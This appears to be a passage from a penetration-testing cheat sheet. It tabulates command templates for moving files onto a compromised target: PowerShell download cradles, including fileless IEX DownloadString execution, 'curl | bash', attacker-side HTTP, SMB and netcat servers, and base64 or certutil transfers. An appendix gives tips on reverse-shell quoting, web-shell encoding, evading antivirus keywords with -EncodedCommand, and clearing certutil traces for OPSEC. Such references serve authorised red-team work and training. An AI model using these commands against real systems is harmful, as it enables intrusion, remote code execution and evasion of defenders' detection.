| `ft-ps-iwr` | powershell | `powershell -c "Invoke-WebRequest -Uri {url} -OutFile {path}"` | PS 3+. Add `-UseBasicParsing` on old/Server Core to avoid IE-engine hang. |
| `ft-ps-wc-file` | powershell | `powershell -c "(New-Object Net.WebClient).DownloadFile('{url}','{path}')"` | Works on PS 2.0 where IWR absent. |
| `ft-ps-downloadstring` | powershell | `powershell -c "IEX(New-Object Net.WebClient).DownloadString('{url}')"` | **Fileless** — runs script in memory, nothing on disk. |
| `ft-ps-iex-iwr` | powershell | `powershell -c "IEX(Invoke-WebRequest -Uri {url} -UseBasicParsing)"` | Fileless via IWR. |

### Linux / macOS — download to disk

| id | tool | template | notes |
|---|---|---|---|
| `ft-wget` | wget | `wget {url} -O {path}` | `-q` quiet. macOS often lacks wget. |
| `ft-curl` | curl | `curl {url} -o {path}` | `-s` silent; `-k` skip TLS verify. curl on both modern Linux + macOS. |
| `ft-curl-pipe` | curl | `curl -s {url} | bash` | Fileless run. |

### Attacker-side servers (source of `{url}`)

| id | tool | command | client fetch |
|---|---|---|---|
| `ft-http-py` | python http.server | `python3 -m http.server 80` | any of the download rows above |
| `ft-http-py2` | python2 | `python2 -m SimpleHTTPServer 80` | legacy fallback |
| `ft-smb-impacket` | impacket-smbserver | `impacket-smbserver share $(pwd) -smb2support` | Windows: `copy \\{lhost}\share\x.exe .` or `\\{lhost}\share\x.exe` |
| `ft-smb-creds` | impacket-smbserver (auth) | `impacket-smbserver share $(pwd) -smb2support -user u -password p` | needed for Win10/11 which block guest SMB2 |
| `ft-nc-push` | netcat | sender: `nc -lvnp {lport} < file` / receiver: `nc {lhost} {lport} > {path}` | when no HTTP/SMB egress |

### base64 copy-paste (no network)

**On attacker:**
```
base64 -w0 file            # Linux
base64 -i file             # macOS (no -w flag)
```
**On target (Linux):**
```
echo <BASE64STRING> | base64 -d > {path}
```
**On target (Windows PowerShell):**
```
[IO.File]::WriteAllBytes("{path}",[Convert]::FromBase64String("<BASE64STRING>"))
```
**On target (Windows certutil):**
```
certutil -decode encoded.b64 {path}
```
**Notes:** watch the shell's max line length — chunk very large blobs. `base64 -w0` prevents line wrapping that corrupts single-echo paste.

---

## Appendix — quoting/escaping traps (cross-cutting)

- **`sh` vs `bash`:** `/dev/tcp` and `>&` need bash. On dash-`sh` systems always invoke `bash -c '...'` or use mkfifo.
- **Single vs double quotes:** Linux payloads use `'...'` outer / `"..."` inner around `{lhost}`. Windows one-liners flip: `"..."` outer / `'...'` inner.
- **`{lport}` type:** bare integer in python/perl/ruby/go/C; quoted string in lua `connect()` and some node forms.
- **Web-shell space encoding:** GET-param cmds need `%20` for spaces, `%26` for `&`.
- **PowerShell:** prefer `-EncodedCommand` (base64 UTF-16LE) to sidestep every quoting/AV keyword issue; `%{0}` array-fill is intentional not a typo.
- **msfvenom nulls:** default shellcode may contain `\x00`/`\x0a`/`\x0d` — for buffer-overflow delivery always `-b` them and re-encode.
- **certutil cache:** leaves artifacts in the urlcache; delete after use for OPSEC.

Sources verified against PayloadsAllTheThings / InternalAllTheThings reverse-shell cheatsheet and Rapid7 Metasploit payload docs (Aug 2026).
